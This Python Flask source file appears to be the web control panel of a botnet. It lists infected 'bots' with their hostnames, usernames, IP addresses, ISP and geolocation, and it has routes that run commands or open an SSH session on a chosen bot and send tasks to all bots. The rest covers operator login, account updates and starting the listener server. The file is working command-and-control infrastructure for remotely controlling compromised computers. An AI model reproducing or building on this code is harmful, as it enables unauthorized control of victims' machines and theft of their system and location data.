# Date: 07/02/2018
# Author: Pure-L0G1C
# Description: Web server

from re import match
from os import urandom
from lib import database, const
from string import ascii_uppercase
from lib.server.server import Server
from flask import Flask, render_template, request, session, jsonify, redirect, url_for

app = Flask(__name__)
app.config['SECRET_KEY'] = urandom(0x200) # cookie encryption

# server
server = Server()
db = database.Database()

# -------- Bots Table -------- #

bots_online_src = ''
bots_signature = None

# -------- Authenticity -------- #

def get_bot(bot_id):
    bots = server.interface.bots
    for bot_session in bots:
        if bots[bot_session]['bot_id'] == bot_id:
            return bots[bot_session]

def login_required(func):
    def wrapper(*args, **kwargs):
        if not 'logged_in' in session:
            return redirect(url_for('index'))
        elif not session['logged_in']:
            return redirect(url_for('index'))
        else:
            return func(*args, **kwargs)
    wrapper.__name__ = func.__name__
    return wrapper

def bot_required(func):
    def wrapper(*args, **kwargs):
        if not 'bot_id' in session:
            return jsonify({'resp': ''})
        if not get_bot(session['bot_id']):
            return jsonify({'resp': ''})
        return func(*args, **kwargs)
    wrapper.__name__ = func.__name__
    return wrapper

# -------- Main Pages -------- #

@app.route('/')
def index():
    if not 'logged_in' in session:
        session['logged_in'] = False
        return render_template('index.html')
    if not session['logged_in']:
        return render_template('index.html')
    return render_template('home.html')

# -------- Subsections of settings -------- #

@app.route('/settings')
@login_required
def settings():
    return render_template('settings.html')

# -------- Intel -------- #

def start_bot_services(bot_id):
    session['bot_id'] = bot_id
    server.interface.ssh_obj(bot_id)

@app.route('/intel')
@login_required
def intel_src():
    bot = None
    all_offline = False if server.interface.bots else True

    if 'id' in request.args:
        global bot_id
        bot_id = request.args.get('id')
        bot = get_bot(bot_id)

    if bot:
        if not 'bot_id' in session:
            start_bot_services(bot_id)
        else:
            if session['bot_id'] != bot_id:
                start_bot_services(bot_id)
        return render_template('intel.html')
    else:
        msg = 'All bots are offline' if all_offline else 'Bot not found'
        return render_template('offline.html', msg=msg)

@app.route('/intel/system/src', methods=['POST'])
@login_required
@bot_required
def intel_system_src():
    src = '''
     <ul class="sub-tabs">
       <li onclick="intelSystemSrc()" class="selected"><div>System</div></li>
       <li onclick="intelNetworkSrc()"><div>Network</div></li>
       <li onclick="intelGeoSrc()"><div>Geo</div></li>
       <li onclick="location.href='/control?id={}'"><div>Controls</div></li>
     </ul>
     <div id="display-area"></div>
    '''.format(bot_id)
    return jsonify({'resp': src})

def render_system_data(data):
    src = '''
      <table>
       <tr>
         <th>Hostname</th>
         <th>Username</th>
         <th>OS</th>
         <th>Version</th>
       </tr>
       {}
      </table>
     '''

    version = data['version'] if 'version' in data else ''
    hostname = data['hostname'] if 'hostname' in data else ''
    username = data['username'] if 'username' in data else ''
    os = '{} {}'.format(data['system'], data['release'])

    info = '''
      <tr>
         <td>{}</td>
         <td>{}</td>
         <td>{}</td>
         <td>{}</td>
      </tr>
    '''.format(hostname, username, os, version)
    return src.format(info)

@app.route('/intel/system/data', methods=['POST'])
@login_required
@bot_required
def intel_system_data():
    bot = get_bot(session['bot_id'])
    src = render_system_data(bot['intel']['sys_info']) if bot else ''
    return jsonify({'resp': src})

@app.route('/intel/network/src', methods=['POST'])
@login_required
@bot_required
def intel_network_src():
    src = '''
     <ul class="sub-tabs">
       <li onclick="intelSystemSrc()"><div>System</div></li>
       <li onclick="intelNetworkSrc()" class="selected"><div>Network</div></li>
       <li onclick="intelGeoSrc()"><div>Geo</div></li>
       <li onclick="location.href='/control?id={}'"><div>Controls</div></li>
     </ul>
     <div id="display-area"></div>
    '''.format(bot_id)
    return jsonify({'resp': src})

def render_network_data(data):
    src = '''
     <table>
      <tr>
        <th>ISP</th>
        <th>Internal IP</th>
        <th>External IP</th>
      </tr>
      {}
     </table>
    '''

    isp = data['isp'] if 'isp' in data else ''
    ex_ip = data['query'] if 'query' in data else ''
    in_ip = data['internalIp'] if 'internalIp' in data else ''

    info = '''
      <tr>
         <td>{}</td>
         <td>{}</td>
         <td>{}</td>
      </tr>
    '''.format(isp, in_ip, ex_ip)
    return src.format(info)

@app.route('/intel/network/data', methods=['POST'])
@login_required
@bot_required
def intel_network_data():
    bot = get_bot(session['bot_id'])
    src = render_network_data(bot['intel']['net_info']) if bot else ''
    return jsonify({'resp': src})

@app.route('/intel/geo/src', methods=['POST'])
@login_required
@bot_required
def intel_geo_src():
    src = '''
     <ul class="sub-tabs">
       <li onclick="intelSystemSrc()"><div>System</div></li>
       <li onclick="intelNetworkSrc()"><div>Network</div></li>
       <li onclick="intelGeoSrc()" class="selected"><div>Geo</div></li>
       <li onclick="location.href='/control?id={}'"><div>Controls</div></li>
     </ul>
     <div id="display-area"></div>
    '''.format(bot_id)
    return jsonify({'resp': src})

def render_geo_data(data):
    src = '''
     <table>
      <tr>
        <th>Country</th>
        <th>Region</th>
        <th>City</th>
        <th>Zip</th>
        <th>Time Zone</th>
        <th>Latitude</th>
        <th>Longitude</th>
      </tr>
      {}
     </table>
    '''

    lat = data['lat'] if 'lat' in data else ''
    lon = data['lon'] if 'lon' in data else ''
    city = data['city'] if 'city' in data else ''
    zip_code = data['zip'] if 'zip' in data else ''
    country = data['country'] if 'country' in data else ''
    time_zone = data['timezone'] if 'timezone' in data else ''
    region = data['regionName'] if 'regionName' in data else ''

    info = '''
      <tr>
         <td>{}</td>
         <td>{}</td>
         <td>{}</td>
         <td>{}</td>
         <td>{}</td>
         <td>{}</td>
         <td>{}</td>
      </tr>
    '''.format(country, region, city, zip_code, time_zone, lat, lon)
    return src.format(info)

@app.route('/intel/geo/data', methods=['POST'])
@login_required
@bot_required
def intel_geo_data():
    bot = get_bot(session['bot_id'])
    src = render_geo_data(bot['intel']['net_info']) if bot else ''
    return jsonify({'resp': src})

# -------- Controls -------- #

@app.route('/control')
@login_required
def controls():
    bot = None
    all_offline = False if server.interface.bots else True

    if 'id' in request.args:
        global bot_id
        bot_id = request.args.get('id')
        bot = get_bot(bot_id)

    if bot:
        session['bot_id'] = bot_id
        return render_template('control.html')
    else:
        msg = 'All bots are offline' if all_offline else 'Bot not found'
        return render_template('offline.html', msg=msg)

@app.route('/control/cmd/src', methods=['POST'])
@login_required
@bot_required
def control_cmd_src():
    src = '''
     <ul class="sub-tabs">
       <li onclick="cmdSrc()" class="selected"><div>Command</div></li>
       <li onclick="sshSrc()"><div>SSH</div></li>
       <li onclick="location.href='/intel?id={}'"><div>Intels</div></li>
     </ul>
     <div id="cmd-line"></div>
     <input id="console" placeholder="help" spellcheck="false" type="text" size=64>
     <img src="/static/img/loading.gif" id="console-load">
    '''.format(bot_id)
    return jsonify({'resp': src})

@app.route('/control/cmd/cmd', methods=['POST'])
@login_required
@bot_required
def control_cmd_cmd():
    resp = ''
    if all(['cmd_id' in request.form, 'args[]' in request.form]):
        cmd_id = request.form['cmd_id']
        args = request.form.getlist('args[]')
        if all([cmd_id.isdigit(), isinstance(args, list)]):
            resp = server.interface.execute_cmd_by_id(session['bot_id'], cmd_id, args)
    return jsonify({'resp': resp})

@app.route('/control/ssh/src', methods=['POST'])
@login_required
@bot_required
def control_ssh_src():
    src = '''
     <ul class="sub-tabs">
       <li onclick="cmdSrc()"><div>Command</div></li>
       <li onclick="sshSrc()" class="selected"><div>SSH</div></li>
       <li onclick="location.href='/intel?id={}'"><div>Intels</div></li>
     </ul>
     <div id="cmd-line"></div>
     <input id="cmd-input" placeholder="menu" spellcheck="false" type="text" size=64>
     <img src="/static/img/loading.gif" id="cmd-load">
    '''.format(bot_id)
    return jsonify({'resp': src})

@app.route('/control/ssh/exe', methods=['POST'])
@login_required
@bot_required
def control_ssh_exe():
    if 'cmd' in request.form:
        cmd = request.form['cmd'].strip()

        if any([not server.interface.ssh, not len(cmd), not get_bot(session['bot_id'])]):
            return jsonify({'resp': ''})
        else:
            resp = server.interface.ssh_exe(cmd)
            return jsonify({'resp': resp if resp else ''})

def populate_bot_table():
    online_bots = ''
    bots = server.interface.bots

    for bot in bots:
        bot_id = bots[bot]['bot_id']
        ip = bots[bot]['intel']['net_info']['query']
        os = bots[bot]['intel']['sys_info']['system']
        version = bots[bot]['intel']['sys_info']['release']
        country = bots[bot]['intel']['net_info']['country']
        hostname = bots[bot]['intel']['sys_info']['hostname']

        online_bots += '''
         <tr>
            <td class="clickable" onclick="location.href='/intel?id={}'">{}</td>
            <td>{}</td>
            <td>{}</td>
            <td>{}</td>
            <td>{}</td>
         </tr>
        '''.format(bot_id, hostname, '{} {}'.format(os, version), ip, country, bot_id[:8])
    return online_bots

@app.route('/fetch_bots', methods=['POST'])
@login_required
def fetch_bots():
    global bots_signature, bots_online_src

    src = '''
      <table>
       <tr>
         <th>Hostname</th>
         <th>OS</th>
         <th>IP</th>
         <th>Country</th>
         <th>ID</th>
       </tr>
       {}
      </table>
     '''

    if server.interface.sig != bots_signature:
        bots_signature = server.interface.sig
        bots_online_src = src.format(populate_bot_table())

    return jsonify({'resp': src.format('') if not bots_signature else bots_online_src,
                    'amount': '{:02,}'.format(len(server.interface.bots)), 'status': server.is_active })

@app.route('/online_bots_source', methods=['POST'])
@login_required
def online_bots_source():
    src = '''
     <ul class="sub-tabs">
      <li onclick="onlineBotsSource()" class="selected"><div>Bots</div></li>
      <li onclick="taskConsoleSource()"><div>Task</div></li>
     </ul>
     <p id="bots-amount">Bots<span>:</span> <span id="amount"></span></p>
     <p id="server-status">Server<span>:</span> <span class="{}">{}</span></p>
     <div id="display-area"></div>
     <p id="last_active">last accessed on {}</p>
    '''.format('status-on' if server.is_active else 'status-off',
               'ON' if server.is_active else 'OFF', session['last_active'])
    return jsonify({'resp': src})

@app.route('/task_console_source', methods=['POST'])
@login_required
def task_console_source():
    src = '''
     <ul class="sub-tabs">
      <li onclick="onlineBotsSource()"><div>Bots</div></li>
      <li onclick="taskConsoleSource()" class="selected"><div>Task</div></li>
     </ul>
     <div id="cmd-line"></div>
     <input id="console" placeholder="help" spellcheck="false" type="text" size=64>
     <img src="/static/img/loading.gif" id="console-load">
     <p id="last_active">last accessed on {}</p>
    '''.format(session['last_active'])
    return jsonify({'resp': src})

@app.route('/task_console_cmd', methods=['POST'])
@login_required
def task_console_cmd():
    resp = ''
    if all(['cmd_id' in request.form, 'args[]' in request.form]):
        cmd_id = request.form['cmd_id']
        args = request.form.getlist('args[]')
        if all([cmd_id.isdigit(), isinstance(args, list)]):
            resp = server.interface.execute_cmd_by_task_id(cmd_id, args)
    return jsonify({'resp': resp})

@app.route('/account_management', methods=['POST'])
@login_required
def account_management():
    src = '''
    <ul class="sub-tabs">
      <li onclick="usernameUpdateSource()" class="selected"><div>Username</div></li>
      <li onclick="passwordUpdateSource()"><div>Password</div></li>
      <li onclick="serverServiceSource()"><div>Server</div></li>
     </ul>
    <div id="display-area"></div>
    '''
    return jsonify({'resp': src})

@app.route('/password_update_source', methods=['POST'])
@login_required
def password_update_source():
    src = '''
     <form>
        <button id="btn-show-hide" onclick="showHide(this)" type="button">Show</button>

        <span id="current_password_status"></span>
        <input type="password" placeholder="Current Password" id="current_password" class="centered" spellcheck="false" onkeyup="statusReport()" onblur="checkCurrentPassword(this.id)">
        <hr style="width: 45%; margin: 2.3% auto; margin-bottom: 4%;">

        <span id="password_status"></span>
        <input type="password" placeholder="New Password" id="new_password" class="centered" spellcheck="false" onkeyup="checkPassword()">
        <input type="password" placeholder="Confirm Password" id="confirm" class="centered" spellcheck="false" onkeyup="confirmPassword(this)" disabled="true">

        <span id="form-status"></span>
        <img src="/static/img/load.gif" id="load">
        <button type="button" id="submit" onclick="updatePassword()">Update Password</button>
     </form>
    '''
    return jsonify({'resp': src})

@app.route('/username_update_source', methods=['POST'])
@login_required
def username_update_source():
    src = '''
     <form>
        <hr style="width: 45%; margin: 2.3% auto; margin-bottom: 4%; margin-top: 20%;">
        <span id="username_status"></span>
        <input type="text" placeholder="New Username" id="new_username" class="centered" spellcheck="false" onkeyup="checkUsername()">
        <span id="form-status"></span>
        <img src="/static/img/load.gif" id="load">
        <button type="button" id="submit" onclick="updateUsername()">Update Username</button>
     </form>
    '''
    return jsonify({'resp': src})

@app.route('/server_management', methods=['POST'])
@login_required
def server_management():
    src = '''
     <ul class="sub-tabs">
       <li onclick="serverServiceSource()" class="selected"><div>Address</div></li>
      </ul>
     <div id="display-area"></div>
    '''
    return jsonify({'resp': src})

def valid_ip(ip):
    if not match(r'^(?!0)(?!.*\.$)((1?\d?\d|25[0-5]|2[0-4]\d)(\.|$)){4}$', ip):
        return False
    if ip != const.PRIVATE_IP:
        return False
    return True

def valid_port(port):
    _port = str(port).strip()

    if not len(_port):
        return False
    else:
        #  check if number
        for item in _port:
            if not item.isdigit():
                return False

        # check if number starts with a zero
        if int(_port[0]) == 0:
            return False

        # check if number is larger than 65535
        if int(_port) > 65535:
            return False

        if any([int(_port) == const.FTP_PORT, int(_port) == const.SSH_PORT]):
            return False
        return True

def server_start(ip, port):
    session['ip'] = ip
    session['port'] = port
    session['server_active'] = True

def server_stop():
    session['ip'] = None
    session['port'] = None
    session['server_active'] = False

@app.route('/server_service', methods=['POST'])
@login_required
def server_service():
    if any([not 'ip' in request.form, not 'port' in request.form]):
        return jsonify({'resp': 'invalid', 'mode': 'Start Server' if session['server_active'] else 'Stop Server',
          'ipFailed': True if not 'ip' in request.form else False, 'portFailed': True if not 'port' in request.form else False})

    ip = request.form['ip']
    port = request.form['port']

    if any([not len(ip.strip()), not len(port.strip())]):
        return jsonify({'resp': 'invalid', 'mode': 'Start Server' if not session['server_active'] else 'Stop Server',
          'ipFailed': True if not len(ip.strip()) else False, 'portFailed': True if not len(port.strip()) else False})

    if any([ip.isdigit(), not port.isdigit()]):
        return jsonify({'resp': 'invalid', 'mode': 'Start Server' if not session['server_active'] else 'Stop Server',
          'ipFailed': True if ip.isdigit() else False, 'portFailed': True if not port.isdigit() else False})

    if any([not valid_ip(ip), not valid_port(port)]):
        return jsonify({'resp': 'invalid', 'mode': 'Start Server' if not session['server_active'] else 'Stop Server',
          'ipFailed': True if not valid_ip(ip) else False, 'portFailed': True if not valid_port(port) else False})

    if session['server_active']:
        server_stop()
        online = server.stop()
        mode = 'Stop Server' if online else 'Start Server'
        failed = True if online else False
        if failed:server_stop()
    else:
        server_start(ip, port)
        online = server.start(ip, port)
        mode = 'Stop Server' if online else 'Start Server'
        failed = False if online else True
        if failed:server_stop()
    return jsonify({'resp': 'valid', 'mode': mode, 'failed': failed})

@app.route('/server_service_source', methods=['POST'])
@login_required
def server_service_source():
    if all([server.is_active, not session['server_active']]):
        server_start(server.ip, server.port)

    if all([not server.is_active, session['server_active']]):
        server_stop()

    src = '''
     <form id="server-address">
      <input type="text" id="ip" placeholder="127.0.0.1" onkeyup="validateIp(this.value)" maxlength="15" style="margin-top: 5px;">
      <span style="color: #000; font-size: 25px; font-family: rich;">:</span>
      <input type="text" id="port" placeholder="8080" style="width: 85px;" onkeyup="validatePort(this.value)" maxlength="5">
      <hr style="width: 45%; margin: 2.3% auto; margin-top: 5%;">
      <img src="/static/img/load.gif" id="server-service-load" >
      <button type="button" id="server-address-btn" onclick="serverService()">Start Server</button>
     </form>
    '''
    return jsonify({'resp': src,
                    'ip': session['ip'] if session['ip'] else '',
                    'port': session['port'] if session['port'] else '', 'mode': 'Stop Server' if session['ip'] else 'Start Server'})

# -------- Validity -------- #

@app.route('/current_password_check', methods=['POST'])
@login_required
def current_password_check():
    password = request.form['password']
    passwords_matched = db.compare_passwords(session['user_id'], password)
    if passwords_matched:
        resp = 'valid'
    else:
        resp = ''
    return jsonify({'resp': resp})

def valid_username(username):
    for item in username:
        if all([not item.isdigit(), not item.isalpha()]):
            return False
    return True

def parse_password(password):
    if password[0].isdigit():
        return 'password must not start with a number'
    if password[-1].isdigit():
        return 'password must not end with a number'

    # check if password contains a letter
    contains_letter = False
    for item in password:
        if item.isalpha():
            contains_letter = True
            break

    if not contains_letter:
        return 'password must contain at least one letter'

    # check if password contains an uppercased letter
    contains_upper_cased = False
    for item in password:
        if item in ascii_uppercase:
            contains_upper_cased = True
            break

    if not contains_upper_cased:
        return 'password must contain at least one upper cased letter'

    # check if password contains a number
    contains_number = False
    for item in password:
        if item.isdigit():
            contains_number = True
            break

    if not contains_number:
        return 'password must contain at least one number number'

    # password must be long
    if len(password) < 12:
        return 'password must contain at least 12 characters'

@app.route('/check_password', methods=['POST'])
@login_required
def is_password_valid():
    if not 'password' in request.form:
        return jsonify({'resp': 'data is incomplete'})

    password = request.form['password']

    if not len(password):
        return jsonify({'resp': ''})

    # enforce best practices
    resp = parse_password(password)
    data = resp if resp else 'valid'
    return jsonify({'resp': data})

@app.route('/password_change_check', methods=['POST'])
@login_required
def password_change_check():
    if not all([_ in request.form for _ in ['current', 'new', 'confirm']]):
        return redirect(url_for('index'))

    current = request.form['current']
    confirm = request.form['confirm']
    new = request.form['new']

    if not all([len(str(_).strip()) for _ in [current, new, confirm]]):
        return jsonify({'resp': 'empty fields detected'})

    if not db.compare_passwords(session['user_id'], current):
        return jsonify({'resp': ''})

    if parse_password(new):
        return jsonify({'resp': 'new password is invalid'})

    if new != confirm:
        return jsonify({'resp': ''})

    if db.compare_passwords(session['user_id'], new):
        return jsonify({'resp': 'the new password seems to match your current password'})

    return jsonify({'resp': 'valid'})

def server_side_password_check(current, new, confirm):
    return False if any([
            new != confirm,
            parse_password(new),
            db.compare_passwords(session['user_id'], new),
            not db.compare_passwords(session['user_id'], current),
            not all([len(str(_).strip()) for _ in [current, new, confirm]])
            ]) else True

@app.route('/update_password', methods=['POST'])
@login_required
def update_password():
    if not all([_ in request.form for _ in ['current', 'new', 'confirm']]):
        return jsonify({'resp': 'data is incomplete'})

    current = request.form['current']
    confirm = request.form['confirm']
    new = request.form['new']

    if server_side_password_check(current, new, confirm):
        db.update_password(session['user_id'], new)
        session['status'] = db.get_account_status(session['user_id'], session['username'])
        return jsonify({'resp': 'Password updated successfully', 'status': session['status']})
    return jsonify({'resp': 'Password failed to update'})

@app.route('/check_username', methods=['POST'])
@login_required
def is_username_valid():
    if not 'username' in request.form:
        return redirect(url_for('index'))

    username = request.form['username']

    if not len(username):
        return jsonify({'resp': ''})

    if any([username[0].isdigit(), not valid_username(username)]):
        return jsonify({'resp': 'invalid username'})

    if len(username) < 4:
        return jsonify({'resp': 'username must be at least 4 characters long'})

    if len(username) > 16:
        return jsonify({'resp': 'username must be no longer than 16 characters'})

    if not any([item.isdigit() for item in username]):
        return jsonify({'resp': 'username must contain at least one number'})

    if db.account_exists(username.lower()):
        return jsonify({'resp': 'username already taken'})

    return jsonify({'resp': 'valid'})

def server_side_username_check(username):
    if any([len(username) < 4, len(username) > 16,
            not valid_username(username), not any([item.isdigit() for item in username]),
             db.account_exists(username.lower())]):
        return False
    return True

@app.route('/update_username', methods=['POST'])
@login_required
def update_username():
    if not 'username' in request.form:
        return jsonify({'resp': 'data is incomplete'})

    username = request.form['username']
    if not server_side_username_check(username):
        return jsonify({'resp': 'Username failed to update', 'status': session['status']})

    session['username'] = username.title()
    db.update_username(session['user_id'], username)
    session['status'] = db.get_account_status(session['user_id'], session['username'])
    return jsonify({'resp': 'Username updated successfully', 'status': session['status']})

# -------- Authentication -------- #

@app.route('/login', methods=['GET', 'POST'])
def login():
    if not 'logged_in' in session:
        return redirect(url_for('index'))

    if not session['logged_in']:
        if not all(['username' in request.form, 'password' in request.form]):
            return redirect(url_for('index'))

        username = request.form['username']
        password = request.form['password']
        user_id = db.authenticate(username, password)

        if user_id:
            session['logged_in'] = True
            session['user_id'] = user_id
            session['username'] = username.title()

            # server
            session['server_active'] = False
            session['port'] = None
            session['ip'] = None

            if server.is_active:
                server_start(server.ip, server.port)

            session['last_active'] = db.get_last_active(user_id)
            session['status'] = db.get_account_status(user_id, username)

            return redirect(url_for('index'))
        else:
            del session['logged_in']
            return redirect(url_for('index'))
    else:
        return redirect(url_for('index'))

def clear_session():
    keys = [_ for _ in session]
    for _ in range(len(keys)):
        del session[keys[_]]

@app.route('/logout')
@login_required
def logout():
    clear_session()
    return redirect(url_for('index'))

if __name__ == '__main__':
    try:app.run(debug=False)
    except KeyboardInterrupt:pass
    finally:server.stop(delay=False)
